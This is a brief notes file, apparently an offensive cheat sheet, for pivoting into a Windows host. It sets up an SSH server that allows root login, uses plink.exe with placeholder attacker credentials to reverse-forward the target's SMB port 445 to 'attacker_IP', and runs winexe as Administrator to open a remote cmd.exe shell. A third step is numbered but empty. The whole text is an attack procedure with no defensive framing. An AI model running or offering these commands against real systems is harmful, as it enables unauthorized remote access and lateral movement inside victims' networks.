Download Plink  from here 

https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html



install ssh server == sudo apt install ssh

gedit /etc/ssh/sshd_config

permit root login yes
service ssh restart 
service ssh start 

1) plink.exe -l attacker_username -pw attacker_password -R port_to_be_forwarded 127.0.0.1:445 attacker_IP
2) winexe -U Administrator%PASSWORD //127.0.0.1 "cmd.exe"
3) 

